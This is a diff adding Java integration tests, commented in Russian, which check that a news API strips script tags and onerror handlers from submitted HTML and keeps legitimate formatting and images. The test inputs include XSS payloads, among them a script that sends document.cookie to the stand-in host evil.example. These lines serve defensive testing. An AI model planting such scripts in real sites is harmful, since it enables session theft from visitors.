@@ -239,6 +239,107 @@ public class NewsIntegrationTest extends AbstractIntegrationTest {
     }
 
     @Test
+    void createNews_WhenContentContainsScript_StripsScriptAndKeepsFormatting() {
+        String token = createAdminAndLogin();
+
+        // Смесь легального форматирования и исполняемого тега: чистка обязана
+        // различать их, а не резать разметку целиком
+        NewsRequestDto request = NewsRequestDto.builder()
+                .title("Test News Title")
+                .shortDescription("Test Description")
+                .postType("news")
+                .content("<p>Защиты пройдут в аудитории <b>0500</b></p>"
+                        + "<script>fetch('https://evil.example/?t=' + document.cookie)</script>")
+                .display(true)
+                .build();
+
+        ResponseEntity<Void> response = restTemplate.postForEntity(
+                "/api/news", withToken(request, token), Void.class);
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CREATED);
+
+        // Проверяем хранилище, а не тело ответа: контент чистится на входе,
+        // значит в базе не должно остаться исполняемой разметки
+        NewsPost saved = newsRepository.findAll().getFirst();
+        assertThat(saved.getContent())
+                .doesNotContain("<script")
+                .contains("<b>0500</b>");
+    }
+
+    @Test
+    void updateNews_WhenContentContainsScript_StripsScript() {
+        User admin = createAdmin();
+        NewsPost saved = saveNews(admin, "Old Title", true);
+        createModerator();
+        String token = login("moderator");
+
+        NewsRequestDto request = NewsRequestDto.builder()
+                .title("New Title")
+                .shortDescription("New Description")
+                .postType("news")
+                .content("<p>Новый текст</p><script>alert(1)</script>")
+                .display(true)
+                .build();
+
+        ResponseEntity<NewsResponseDto> response = restTemplate.exchange(
+                "/api/news/" + saved.getId(), HttpMethod.PUT, withToken(request, token), NewsResponseDto.class);
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+
+        // Правка существующей новости — вторая дверь в базу, и она тоже должна быть закрыта
+        NewsPost updated = newsRepository.findById(saved.getId()).orElseThrow();
+        assertThat(updated.getContent())
+                .doesNotContain("<script")
+                .contains("<p>Новый текст</p>");
+    }
+
+    @Test
+    void createNews_WhenContentContainsEventHandler_StripsHandler() {
+        String token = createAdminAndLogin();
+
+        // Тега script здесь нет: код спрятан в атрибуте. Ловится только белым списком
+        NewsRequestDto request = NewsRequestDto.builder()
+                .title("Test News Title")
+                .shortDescription("Test Description")
+                .postType("news")
+                .content("<p>Текст <img src=\"x\" onerror=\"alert(1)\"></p>")
+                .display(true)
+                .build();
+
+        ResponseEntity<Void> response = restTemplate.postForEntity(
+                "/api/news", withToken(request, token), Void.class);
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CREATED);
+
+        NewsPost saved = newsRepository.findAll().getFirst();
+        assertThat(saved.getContent())
+                .doesNotContain("onerror")
+                .doesNotContain("alert(1)");
+    }
+
+    @Test
+    void createNews_WhenContentHasRelativeImage_KeepsImage() {
+        String token = createAdminAndLogin();
+
+        // Картинки портала лежат по относительным путям — чистка не должна их терять
+        NewsRequestDto request = NewsRequestDto.builder()
+                .title("Test News Title")
+                .shortDescription("Test Description")
+                .postType("news")
+                .content("<p>Фото с защиты</p><img src=\"/media/foto.jpg\">")
+                .display(true)
+                .build();
+
+        ResponseEntity<Void> response = restTemplate.postForEntity(
+                "/api/news", withToken(request, token), Void.class);
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CREATED);
+
+        NewsPost saved = newsRepository.findAll().getFirst();
+        assertThat(saved.getContent()).contains("/media/foto.jpg");
+    }
+
+    @Test
     void getNews_WhenSortFieldIsUnknown_Returns400() {
         ResponseEntity<ProblemDetail> response = restTemplate.getForEntity(
                 "/api/public/news?sort=abc",
